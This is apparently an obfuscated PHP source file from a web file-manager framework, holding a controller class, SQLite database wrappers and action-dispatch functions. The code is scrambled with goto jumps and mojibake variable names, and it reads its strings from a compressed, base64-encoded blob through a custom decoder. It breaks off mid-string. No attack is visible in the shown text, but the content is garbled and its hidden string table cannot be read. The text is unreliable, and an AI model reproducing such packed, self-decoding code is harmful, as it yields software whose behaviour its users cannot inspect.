$eöÛŠµĞõÑ[816] . trim($Côˆ‹ÑÈ¢³, $eöÛŠµĞõÑ[816]) . $eöÛŠµĞõÑ[816]; } return $Côˆ‹ÑÈ¢³; } } goto eõØ™ÒÏ‚; føğÌùù¡î: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto dÍ…†ÀÓ¸‚; b³Œ›¸Å‘: $this->in =& $in; $this->values[$AÎ—³²ñ[6]] =& $config; $this->values[$AÎ—³²ñ[7]] =& $in; goto bİÙ·ÈÚ™±; dÍ…†ÀÓ¸‚: $AÎ—³²ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; global $in, $config; $this->config =& $config; goto b³Œ›¸Å‘; bİÙ·ÈÚ™±: $this->tpl = TEMPLATE . MOD . $AÎ—³²ñ[8]; $this->_classObjectID = mt_rand(0, 10000); goto b½ô–±ÃŸÛ; b½ô–±ÃŸÛ: } public function loadClass($b‡ó¡ˆ‘Ô) { if (1 === func_num_args()) { $this->{$b‡ó¡ˆ‘Ô} = new $b‡ó¡ˆ‘Ô(); } else { $A‡‰¿°éÀÚ = new ReflectionClass($b‡ó¡ˆ‘Ô); $e¦ƒ¡´½ğÛ = func_get_args(); array_shift($e¦ƒ¡´½ğÛ); $this->{$b‡ó¡ˆ‘Ô} = $A‡‰¿°éÀÚ->newInstanceArgs($e¦ƒ¡´½ğÛ); } return $this->{$b‡ó¡ˆ‘Ô}; } protected function assign($c½ƒ¯÷çŞ, $Fğ¯ÛÀ±¯Æ) { $this->values[$c½ƒ¯÷çŞ] = $Fğ¯ÛÀ±¯Æ; } protected function display($FèªºÁŠÙè) { ob_end_clean(); extract($this->values); require $this->tpl . $FèªºÁŠÙè; } } class DbSqliteBase extends Db { public function __construct($EËªÄ–›³‹ = '') { $B¶Ğä…¶¦ƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!extension_loaded($B¶Ğä…¶¦ƒ[9])) { think_exception(think_lang($B¶Ğä…¶¦ƒ[10]) . $B¶Ğä…¶¦ƒ[11]); } if (!empty($EËªÄ–›³‹)) { if (!isset($EËªÄ–›³‹[$B¶Ğä…¶¦ƒ[12]])) { $EËªÄ–›³‹[$B¶Ğä…¶¦ƒ[12]] = 438; } $this->config = $EËªÄ–›³‹; if (empty($this->config[$B¶Ğä…¶¦ƒ[13]])) { $this->config[$B¶Ğä…¶¦ƒ[13]] = array(); } } } public function connect($b¶Ï„÷…· = '', $Dğ°Å§“º‹ = 0) { $cÖàÓº“ÜË =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->linkID[$Dğ°Å§“º‹])) { goto B‡À×Éº; CŸ††‘…ˆ„: $this->linkID[$Dğ°Å§“º‹] = $dÑñœÏÏİê($b¶Ï„÷…·[$cÖàÓº“ÜË[17]], $b¶Ï„÷…·[$cÖàÓº“ÜË[12]]); if (!$this->linkID[$Dğ°Å§“º‹]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d…½ª‹ÈÖØ; B‡À×Éº: if (empty($b¶Ï„÷…·)) { $b¶Ï„÷…· = $this->config; } $d³ê°åªˆ§ = !empty($b¶Ï„÷…·[$cÖàÓº“ÜË[13]][$cÖàÓº“ÜË[14]]) ? $b¶Ï„÷…·[$cÖàÓº“ÜË[13]][$cÖàÓº“ÜË[14]] : $this->pconnect; $dÑñœÏÏİê = $d³ê°åªˆ§ ? $cÖàÓº“ÜË[15] : $cÖàÓº“ÜË[16]; goto CŸ††‘…ˆ„; d…½ª‹ÈÖØ: @sqlite_busy_timeout($this->linkID[$Dğ°Å§“º‹], 30000); if (1 != think_config($cÖàÓº“ÜË[18])) { unset($this->config); } goto A˜Ç‰†ˆè; A˜Ç‰†ˆè: } return $this->linkID[$Dğ°Å§“º‹]; } public function free() { $this->queryID = null; } public function query($C´®»ôáê¬) { goto CŞƒŠ©—¸ƒ; e›ˆåÂ’©®: think_status($aÒÉŒÏ…ô[20]); $this->queryID = sqlite_query($this->_linkID, $C´®»ôáê¬); $this->debug(); goto B ¼Î¹¡ùº; B ¼Î¹¡ùº: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c˜™á®¹Ø = $this->getAll(); return $c˜™á®¹Ø; } goto fºÁÉ†‹ò; c¨ƒİÈ¨Æš: $this->queryStr = $C´®»ôáê¬; if ($this->queryID) { $this->free(); } think_action_status($aÒÉŒÏ…ô[19], 1); goto e›ˆåÂ’©®; CŞƒŠ©—¸ƒ: $aÒÉŒÏ…ô =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c¨ƒİÈ¨Æš; fºÁÉ†‹ò: } public function execute($c«å‚š‘è®) { goto C›ÌôĞ…œ; Dß†ÎÄˆİ‡: if (!1 === $f«°â‚ÅÉĞ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c¬†ÊÅ·™¸; C›ÌôĞ…œ: $Dªîø¥”›Ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cäİ¨š´·; cäİ¨š´·: $this->queryStr = $c«å‚š‘è®; if ($this->queryID) { $this->free(); } think_action_status($Dªîø¥”›Ë[21], 1); goto f¯ìøÆ×÷—; f¯ìøÆ×÷—: think_status($Dªîø¥”›Ë[20]); $f«°â‚ÅÉĞ = sqlite_exec($this->_linkID, $c«å‚š‘è®); $this->debug(); goto Dß†ÎÄˆİ‡; c¬†ÊÅ·™¸: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ºÖÙÂŒäÉê‡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F‡Ûåò—  = sqlite_query($this->_linkID, $_SERVER[ºÖÙÂŒäÉê‡][23]); if (!$F‡Ûåò— ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cŒ‘£Í‹Ò˜ = sqlite_query($this->_linkID, $_SERVER[ºÖÙÂŒäÉê‡][24]); if (!$cŒ‘£Í‹Ò˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a°Â°‰„‘« = array(); if ($this->numRows > 0) { for ($CÍ »…ëã² = 0; $CÍ »…ëã² < $this->numRows; $CÍ »…ëã²++) { $a°Â°‰„‘«[$CÍ »…ëã²] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $a°Â°‰„‘«; } public function getFields($EÃÆ„ÒŒñâ) { $d»Â‘â‹ÅĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aùèá¦Ö” = $this->query($d»Â‘â‹ÅĞ[25] . $EÃÆ„ÒŒñâ . $d»Â‘â‹ÅĞ[26]); $C…ñù •‡ñ = array(); if ($Aùèá¦Ö”) { foreach ($Aùèá¦Ö” as $E¿½Ç”òğ˜ => $CÜ©¤ÕÃ°•) { $C…ñù •‡ñ[$CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[27]]] = array($d»Â‘â‹ÅĞ[28] => $CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[27]], $d»Â‘â‹ÅĞ[29] => $CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[30]], $d»Â‘â‹ÅĞ[31] => (bool) ($CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[32]] === $d»Â‘â‹ÅĞ[33]), $d»Â‘â‹ÅĞ[34] => $CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[35]], $d»Â‘â‹ÅĞ[36] => strtolower($CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[37]]) == $d»Â‘â‹ÅĞ[38], $d»Â‘â‹ÅĞ[39] => strtolower($CÜ©¤ÕÃ°•[$d»Â‘â‹ÅĞ[40]]) == $d»Â‘â‹ÅĞ[41]); } } return $C…ñù •‡ñ; } public function getTables($fğöÇÑ±¡¹ = '') { $DÓ¤‚…åĞø =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÒÑ»©Ÿ¾ë = $this->query($DÓ¤‚…åĞø[42] . $DÓ¤‚…åĞø[43] . $DÓ¤‚…åĞø[44]); $Fó‰èÛ‹Ö = array(); foreach ($BÒÑ»©Ÿ¾ë as $c– Ûë¨™ì => $BìÓ¡µ°Ã) { $Fó‰èÛ‹Ö[$c– Ûë¨™ì] = current($BìÓ¡µ°Ã); } return $Fó‰èÛ‹Ö; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $DÅØ¼µæß™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÈ®ëˆÎÒÈ = sqlite_last_error($this->_linkID); $this->error = $dÈ®ëˆÎÒÈ . $DÅØ¼µæß™[4] . sqlite_error_string($dÈ®ëˆÎÒÈ); if ($DÅØ¼µæß™[33] != $this->queryStr) { $this->error .= LNG($DÅØ¼µæß™[45]) . $this->queryStr; } think_trace($this->error, $DÅØ¼µæß™[33], $DÅØ¼µæß™[46]); return $this->error; } public function escapeString($FœÏí™Áö÷) { return sqlite_escape_string($FœÏí™Áö÷); } public function parseLimit($cÂ¼‹Á½Ä) { $CªºªÁøØé =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dº«ùæƒî = $CªºªÁøØé[33]; if (!empty($cÂ¼‹Á½Ä)) { $cÂ¼‹Á½Ä = explode($CªºªÁøØé[47], $cÂ¼‹Á½Ä); if (count($cÂ¼‹Á½Ä) > 1) { $Dº«ùæƒî .= $CªºªÁøØé[48] . $cÂ¼‹Á½Ä[1] . $CªºªÁøØé[49] . $cÂ¼‹Á½Ä[0] . $CªºªÁøØé[50]; } else { $Dº«ùæƒî .= $CªºªÁøØé[48] . $cÂ¼‹Á½Ä[0] . $CªºªÁøØé[50]; } } return $Dº«ùæƒî; } } class DbSqlite3Base extends Db { public function __construct($fá•„ÎˆÕÃ = '') { $fâ½Ğ´êÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!class_exists($fâ½Ğ´êÁ[51])) { think_exception(think_lang($fâ½Ğ´êÁ[10]) . $fâ½Ğ´êÁ[52]); } if (!empty($fá•„ÎˆÕÃ)) { if (!isset($fá•„ÎˆÕÃ[$fâ½Ğ´êÁ[12]])) { $fá•„ÎˆÕÃ[$fâ½Ğ´êÁ[12]] = 438; } $this->config = $fá•„ÎˆÕÃ; if (empty($this->config[$fâ½Ğ´êÁ[13]])) { $this->config[$fâ½Ğ´êÁ[13]] = array(); } } } public function connect($aŒº»Î¯Ö = '', $aùÒ·à™ÀÏ = 0) { $DŒù†ØõÄ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->linkID[$aùÒ·à™ÀÏ])) { if (empty($aŒº»Î¯Ö)) { $aŒº»Î¯Ö = $this->config; } $this->linkID[$aùÒ·à™ÀÏ] = new SQLite3($aŒº»Î¯Ö[$DŒù†ØõÄ[17]]); if (!$this->linkID[$aùÒ·à™ÀÏ]) { think_exception($this->linkID[$aùÒ·à™ÀÏ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aùÒ·à™ÀÏ]->busyTimeout(30000); if (1 != think_config($DŒù†ØõÄ[18])) { unset($this->config); } } return $this->linkID[$aùÒ·à™ÀÏ]; } public function free() { $this->queryID = null; } public function query($a÷®—‘ÆÉª) { goto dÎÒ‡øÇ™; bÊéÂÈİŠ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bó…–ÈÚ‡ = $this->getAll(); $this->numRows = count($bó…–ÈÚ‡); return $bó…–ÈÚ‡; } goto E¤Á¡‡•‘; f²ÇÈØñÁº: think_status($EÉÊï»ˆ±¤[20]); $this->queryID = $this->_linkID->query($a÷®—‘ÆÉª); $this->debug(); goto bÊéÂÈİŠ; dÎÒ‡øÇ™: $EÉÊï»ˆ±¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÕ›ã°Öå‚; CÕ›ã°Öå‚: $this->queryStr = $a÷®—‘ÆÉª; if ($this->queryID) { $this->free(); } think_action_status($EÉÊï»ˆ±¤[19], 1); goto f²ÇÈØñÁº; E¤Á¡‡•‘: } public function execute($EŒİÇ£¢²Â) { goto CÏ‹š©‘è§; aÍ²ÒˆºŞö: if (!1 === $BĞì¶÷¸ª) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto CçŠ Üî‰; DØÁ¨¨ßèô: think_status($b‰ÏÆ¤Ş§è[20]); $BĞì¶÷¸ª = $this->_linkID->exec($EŒİÇ£¢²Â); $this->debug(); goto aÍ²ÒˆºŞö; CÏ‹š©‘è§: $b‰ÏÆ¤Ş§è =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d‚µÍœøÀ; d‚µÍœøÀ: $this->queryStr = $EŒİÇ£¢²Â; if ($this->queryID) { $this->free(); } think_action_status($b‰ÏÆ¤Ş§è[21], 1); goto DØÁ¨¨ßèô; CçŠ Üî‰: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ºÖÙÂŒäÉê‡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F“´óåÁ¡É = $this->_linkID->query($_SERVER[ºÖÙÂŒäÉê‡][23]); if (!$F“´óåÁ¡É) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÆ›™®åª× = $this->_linkID->query($_SERVER[ºÖÙÂŒäÉê‡][24]); if (!$BÆ›™®åª×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CóÛ‡Š° = array(); while ($D”á÷ÌŞÌõ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $CóÛ‡Š°[] = $D”á÷ÌŞÌõ; } $this->queryID->reset(); return $CóÛ‡Š°; } public function getFields($eñ¡¶öÊ) { $D‰÷†ˆÓ•Ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $cäâ—ÄĞª¼ = $this->query($D‰÷†ˆÓ•Ó[25] . $eñ¡¶öÊ . $D‰÷†ˆÓ•Ó[26]); $b©äŞ³ æ = array(); if ($cäâ—ÄĞª¼) { foreach ($cäâ—ÄĞª¼ as $E¾†Ëùƒğ‹ => $c’¯ˆÀÀÛğ) { $b©äŞ³ æ[$c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[28]]] = array($D‰÷†ˆÓ•Ó[28] => $c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[28]], $D‰÷†ˆÓ•Ó[29] => $c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[29]], $D‰÷†ˆÓ•Ó[31] => (bool) ($c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[31]] === $D‰÷†ˆÓ•Ó[33]), $D‰÷†ˆÓ•Ó[34] => $c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[53]], $D‰÷†ˆÓ•Ó[36] => (bool) $c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[54]], $D‰÷†ˆÓ•Ó[39] => (bool) $c’¯ˆÀÀÛğ[$D‰÷†ˆÓ•Ó[54]]); } } return $b©äŞ³ æ; } public function getTables($B«ì†£áÒ˜ = '') { $Cñ¤òÜ“¡» =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¿¢¡ß×ñ” = $this->query($Cñ¤òÜ“¡»[42] . $Cñ¤òÜ“¡»[43] . $Cñ¤òÜ“¡»[44]); $E•Çé¸Î = array(); foreach ($d¿¢¡ß×ñ” as $Eöè‹ˆ˜¥Ş => $DŠ‚£Ô“ÄĞ) { $E•Çé¸Î[$Eöè‹ˆ˜¥Ş] = current($DŠ‚£Ô“ÄĞ); } return $E•Çé¸Î; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÕˆêË¸ö =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->error = $this->_linkID->lastErrorMsg(); if ($dÕˆêË¸ö[33] != $this->queryStr) { $this->error .= LNG($dÕˆêË¸ö[45]) . $this->queryStr; } think_trace($this->error, $dÕˆêË¸ö[33], $dÕˆêË¸ö[46]); return $this->error; } public function escapeString($e‹ØÒ¸¦) { $a•§‡ÏØ®× =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->_linkID) { return $this->_linkID->escapeString($e‹ØÒ¸¦); } return str_ireplace($a•§‡ÏØ®×[55], $a•§‡ÏØ®×[56], $e‹ØÒ¸¦); } public function parseLimit($AáÆ‚‰Ó²ç) { $C×İÔİô§É =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÁëĞè¯ = $C×İÔİô§É[33]; if (!empty($AáÆ‚‰Ó²ç)) { $AáÆ‚‰Ó²ç = explode($C×İÔİô§É[47], $AáÆ‚‰Ó²ç); if (count($AáÆ‚‰Ó²ç) > 1) { $BÁëĞè¯ .= $C×İÔİô§É[48] . $AáÆ‚‰Ó²ç[1] . $C×İÔİô§É[49] . $AáÆ‚‰Ó²ç[0] . $C×İÔİô§É[50]; } else { $BÁëĞè¯ .= $C×İÔİô§É[48] . $AáÆ‚‰Ó²ç[0] . $C×İÔİô§É[50]; } } return $BÁëĞè¯; } } goto c‹äØâÔÔà; c‹¼…ÎË”: $_SERVER[‘Ûª¥Ç…] = explode($_SERVER[ºÖÙÂŒäÉê‡][552], gzinflate(substr($_SERVER[ºÖÙÂŒäÉê‡][553], 10, -8))); $aíˆ¥õ“²Û = $_SERVER[ºÖÙÂŒäÉê‡][554]; if (!$aíˆ¥õ“²Û) { return; } goto eŒë–÷Ñ; BÍ©‡Ë©Ì˜: function Action($b¶¥¾ç¨Ù£ = '') { goto DÊ•¨®¢¿; c–Â°°ëè: if (!class_exists($AÓÓ†ã¡†)) { return actionCallError("\x5b{$b¶¥¾ç¨Ù£}\40\75\76\x20{$AÓÓ†ã¡†}\135\40\143\x6c\141\163\x73\x20\156\x6f\x74\x20\145\170\x69\x73\x74\x73\x21"); } $d Œù•¥Ê„[$B³ŞßÄŒí£] = new $AÓÓ†ã¡†(); return $d Œù•¥Ê„[$B³ŞßÄŒí£]; goto A³˜õöï–ñ; aï‘ÒØº»ã: $B³ŞßÄŒí£ = strtolower($AÓÓ†ã¡†); if (isset($d Œù•¥Ê„[$B³ŞßÄŒí£])) { return $d Œù•¥Ê„[$B³ŞßÄŒí£]; } if (is_file($cµİ¸Èæ…¨)) { include_once $cµİ¸Èæ…¨; } goto c–Â°°ëè; AÖ‰ŒÙÌ„: $fë¢á©„²Â = explode($aØëÉ¥Ì[5], $b¶¥¾ç¨Ù£); $Añˆè›‹¶ = strtolower($fë¢á©„²Â[0]); if (substr($Añˆè›‹¶, -6) == $aØëÉ¥Ì[6]) { $b¶¥¾ç¨Ù£ = substr($fë¢á©„²Â[0], 0, -6); $AÓÓ†ã¡† = $b¶¥¾ç¨Ù£ . $aØëÉ¥Ì[7]; $cµİ¸Èæ…¨ = $aØëÉ¥Ì[8]; if (isset($fë¢á©„²Â[1]) && substr(strtolower($fë¢á©„²Â[1]), -5) == $aØëÉ¥Ì[9]) { $AÓÓ†ã¡† = $b¶¥¾ç¨Ù£ . $fë¢á©„²Â[1]; $cµİ¸Èæ…¨ = $aØëÉ¥Ì[10] . $fë¢á©„²Â[1] . $aØëÉ¥Ì[11]; } else { if (count($fë¢á©„²Â) == 3) { $AÓÓ†ã¡† = $b¶¥¾ç¨Ù£ . $fë¢á©„²Â[1] . $fë¢á©„²Â[2]; $cµİ¸Èæ…¨ = $aØëÉ¥Ì[12] . $fë¢á©„²Â[1] . $aØëÉ¥Ì[13] . $fë¢á©„²Â[2] . $aØëÉ¥Ì[11]; } } $cµİ¸Èæ…¨ = PLUGIN_DIR . $b¶¥¾ç¨Ù£ . $aØëÉ¥Ì[4] . $cµİ¸Èæ…¨; } else { if (substr($Añˆè›‹¶, -5) == $aØëÉ¥Ì[9]) { $b¶¥¾ç¨Ù£ = substr($fë¢á©„²Â[0], 0, -5); return Model($b¶¥¾ç¨Ù£); } else { $AÓÓ†ã¡† = $fë¢á©„²Â[0] . $fë¢á©„²Â[1]; $cµİ¸Èæ…¨ = CONTROLLER_DIR . $fë¢á©„²Â[0] . $aØëÉ¥Ì[4] . $fë¢á©„²Â[1] . $aØëÉ¥Ì[14]; } } goto aï‘ÒØº»ã; DÊ•¨®¢¿: $aØëÉ¥Ì =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; static $d Œù•¥Ê„ = array(); $b¶¥¾ç¨Ù£ = trim(str_replace($aØëÉ¥Ì[4], $aØëÉ¥Ì[5], $b¶¥¾ç¨Ù£), $aØëÉ¥Ì[4]); goto AÖ‰ŒÙÌ„; A³˜õöï–ñ: } function ActionApply($aÂ­×Ö”ÙÂ, $F˜‰‘õ’÷ = array()) { goto cƒŞè’; e‹¶Ë»‚Œ¨: if (!method_exists($D¯È’¨×ç›, $a®¤Ò‚ø¡¶)) { return actionCallError("{$aÂ­×Ö”ÙÂ}\x20\x6d\x65\164\x68\x6f\144\40\x6e\157\x74\40\145\170\151\x73\164\163\41"); } $bÇ´´°éØ… = call_user_func_array(array($D¯È’¨×ç›, $a®¤Ò‚ø¡¶), $F˜‰‘õ’÷); return $bÇ´´°éØ…; goto D½ÛÑÊĞñ‡; a‹ˆ‹ ‡Ğ«: $bƒÔøîë› = substr($aÂ­×Ö”ÙÂ, 0, $aé´ŒÎÌ‹); $a®¤Ò‚ø¡¶ = substr($aÂ­×Ö”ÙÂ, $aé´ŒÎÌ‹ + 1); $D¯È’¨×ç› = Action($bƒÔøîë›); goto e‹¶Ë»‚Œ¨; cƒŞè’: if (is_array($aÂ­×Ö”ÙÂ)) { return call_user_func_array($aÂ­×Ö”ÙÂ, $F˜‰‘õ’÷); } if (function_exists($aÂ­×Ö”ÙÂ)) { return call_user_func_array($aÂ­×Ö”ÙÂ, $F˜‰‘õ’÷); } $aé´ŒÎÌ‹ = strrpos($aÂ­×Ö”ÙÂ, $_SERVER[Ş†Ÿ·Ñ«”ÔÂ][5]); goto a‹ˆ‹ ‡Ğ«; D½ÛÑÊĞñ‡: } function actionCallError($dª¿‹ï“) { $d¼ÜÀíŸŸ† =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; $aá…³Ø–òÁ = json_encode_force(array($d¼ÜÀíŸŸ†[15] => this_url(), $d¼ÜÀíŸŸ†[16] => $GLOBALS[$d¼ÜÀíŸŸ†[16]])); $aá…³Ø–òÁ = str_replace(array($d¼ÜÀíŸŸ†[17]), array($d¼ÜÀíŸŸ†[4]), $aá…³Ø–òÁ); return write_log($dª¿‹ï“ . $d¼ÜÀíŸŸ†[18] . $aá…³Ø–òÁ, $d¼ÜÀíŸŸ†[19]); } goto f‹î¹³ãîø; F’ŒŠÈÀ³•: if (!function_exists('_kodDe')) { function _kodDe($BÌâÖÉ¥ ½) { $BÌâÖÉ¥ ½ = base64_decode($BÌâÖÉ¥ ½); $eÆöä‚Ã÷ = strlen($BÌâÖÉ¥ ½); $b„òÍøÌö£ = ''; $Cä†‘ÍÍÅ³ = ord($BÌâÖÉ¥ ½[0]) - 30; for ($d½Î£º‚©Œ = 1; $d½Î£º‚©Œ < $eÆöä‚Ã÷; $d½Î£º‚©Œ += 2) { if ($d½Î£º‚©Œ + 1 < $eÆöä‚Ã÷) { $b„òÍøÌö£ .= chr(ord($BÌâÖÉ¥ ½[$d½Î£º‚©Œ + 1]) + $Cä†‘ÍÍÅ³); $b„òÍøÌö£ .= chr(ord($BÌâÖÉ¥ ½[$d½Î£º‚©Œ]) + $Cä†‘ÍÍÅ³); } else { $b„òÍøÌö£ .= chr(ord($BÌâÖÉ¥ ½[$d½Î£º‚©Œ]) + $Cä†‘ÍÍÅ³); } } return $b„òÍøÌö£; } } define("\xba\xd6\xd9\xc2\x8c\xe4\xc9\xea\x87", "\xc7\xa0\xe0\xf3"); $_SERVER[ºÖÙÂŒäÉê‡] = explode("\174\1\174\1\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\11\140\33\305\265\264\20\112\270\112\313\125\12\205\215\223\340\43\72\174\345\162\342\70\262\45\333\112\144\313\110\162\234\140\71\312\112\132\111\153\113\132\171\167".strrev('ï37›Íã™¼Şf´ı)’»3ÜÿJP)h'."\n".'á#„(P…'."\r".'Ë@€hP%Ü«îQËMË@›”'."\n".'RÚq%')."\275\371\353\11\227\334\361\324\265\233\236\175\140\352\33\340\177\63\136\275\350\343\167\337\72\353\175\34\231\332\3\374\273\73\16\37\365\363\275\166\103\377\355\236\73\346\376\336\157\66\34\160\352\123\147\307".base64_decode('7n/k7OO2LGmQakY2zXWNPvXL5it+8MIJTy/ILfzuHx7+XeNv31txp/nXlTsfu+c8+V/X/vvBLz8=')."\172\156\305\223\173\155\234\77\357\266\116\307\304\33\53\217\334\155\315\267\73\16\75\376\231\67\217\75\154\313\157\17\331\361\170\161\150\373\31\331\13\356\376\326\352\137\34\160\376\317\236\274\274\277\365\262"."\73\216\75\376\203\177\153\305\263\6\46\353\126\55\374\327\257\267\214\354\373\352\346\177\354\365\341\346\373\237\254\236\330\355\225\376\316\7\116\373\341\135\7\34\360\300\113\371\337\367\255\250\131\76\262\347".base64_decode('kgO2Linet+LvO48f/87sNScP73P7Kc2ztzywYkvw9c9O+uTeI1e1/3atd9ucx7YZ5/Zua77otx8=').base64_decode('Vs3a9d1Vf+5YtemYF7XzJxZtPetbCw7/U/XW2FmzDp+rdR957Vl3N+U/OcPQNv1qfeqpeZ61v1k=')."\120\347\351\354\174\165\351\136\107\36\167\317\53\361\165\123\127\64\37\361\304\213\257\53\267\276\250\157\73\342\15\143\373\205\167\256\377\366\322\377\274\165\307\374\363\76\77\316\70\360\326\123\146\234\370\334"."\305\63\356\274\352\72\171\306\302\133\132\376\263\370\61\371\362\163\157\172\373\214\47\73\27\254\252\133\177\341\1\237\56\370\347\71\103\177\363\177\276\317\362\155\373\15\274\362\315\335\166\303\35\335\202\177".base64_decode('pLxmSsq4apgGBiS0fEpN47Cax79u/GOMZlVTweFYbzASC/f39flCkRgpUUzPaUkSKsi6nCOFFxQ=')."\335\0\237\22\213\213\25\264\202\222\267\100\70\40\51\233\162\134\66\110\111\336\366\230\327\327\27\10\256\211\105\326\364\371\10\106\74\66\132\124\364\11\34\103\301\260\51\353\146\104\315\51\14\143\114\147"."\365\152\367\165\371\173\245\110\310\323\33\366\164\104\374\301\136\14\356\10\366\364\370\43\345\360\120\60\20\150\367\164\254\54\117\351\13\171\272\172\74\22\250\137\126\211\251\371\224\126\43\255\303\51\353\244".strrev('\'ÍMM 8 Á2¥}6™9« ¤b¼Ï¤³%%R!eéY³È1¡ Q9­2ól•TèZ').strrev('è/_8KW£V·ªÁ\'È_n¥ÑS'."\r".'“‘C"G°PÎ¥5`‘×À_aQIä§%t\'ƒ‡2ên7Äp').base64_decode('yRMISNOVYCq5Ai0G56lQWDDk9YWk9jUS76eElstpeRcoBYynKVTVFwrhgINQcMAPh45Egp2dYR8=')._kodDe('MH95C7TuAVcjQhB3WEETIUeARDOhmjjmEYilfuq7TfIOmCrD1A8QQESUcoef8DF4Mz6b/DbBUoq2')."\2\23\254\204\203\255\313\360\357\22\202\24\217\301\64\105\67\143\112\76\241\45\325\74\231\206\155\144\312\21\302\223\315\214\127\127\1\36\51\120\163\45\264\302\104\217\126\42\155\110\251\131\45\300\146\131"."\x4a\xcb\x26\x15\x9d\xc7\xb\x20\xbb\x98\x42\x1a\xa3\x4e\xa\xb9\x7b\x8b\x39\x11\x85\x45\x13\x19\x35\x9b\xd4\xe9\xe4\xfc\x2a\xcc\x6\x52\xac\x62\x9a\xa0\x19\x6\xad\x69\x7f\x21\xab\xc9\xc9\xb0\xa2\xb\xb5\xef\x4\xc5\x4\x8b"."\246\10\54\42\264\116\115\317\171\1\3\40\275\3\310\136\355\257\220\60\102\11\77\51\164\212\13\377\270\153\6\217\163\176\71\64\270\34\374\123\113\270\130\224\124\55\243\144\263\61\145\134\41\23\44\227"."\x9c\x6f\xd0\xda\xbb\x8d\xb8\x9a\x77\x3\x8\x8e\xfa\x83\xb1\x8c\x6c\x64\x7a\x92\xf3\x63\x28\x17\xa9\x79\x3e\xa9\x8c\xbb\xa\x99\x2\x8e\xf2\x9\x4c\x28\x17\x76\x74\xaf\x66\xfa\x4\xde\x9a\xd5\x12\x72\x56\x6c\x22\xe\x67\x4c"."\xb3\x10\x56\xf2\x49\xd8\x13\xa4\x29\xda\x58\x1e\xf5\x54\x41\x51\x8\x92\xd7\x21\x25\xa5\x1e\x69\x8d\xd4\xdd\xa2\xb6\x50\xb2\x2\x44\x92\x9a\xe0\xac\x2e\x63\xe6\xb2\x2c\x44\x9b\xc9\x60\x6\x3\x9a\xe3\x84\x18\xaa\x48\x5c\x19"."\67\111\357\110\113\22\31\131\7\343\326\132\64\123\316\105\30\50\27\12\131\65\41\233\252\226\167\153\11\123\61\235\206\251\53\62\51\255\152\211\4\111\1\116\335\72\234\213\116\233\16\55\157\202\171\353"."\x8c\xe8\x72\xde\x48\x29\xba\xd3\x47\xe8\xba\x45\x2\x1d\xcc\x58\x17\x45\xf3\xaa\x46\x41\x33\x54\xf8\x99\x16\x49\x36\x4d\x39\x91\x81\xd3\x9e\x17\xdf\xfa\x15\xf8\x6a\x3e\xab\xe6\x95\x32\x5c\x4f\x22\xa1\x18\x86\x13\x66\xd1\xb5"."\xac\xd3\x93\xcd\x6a\x63\xce\xa0\xae\xa6\x5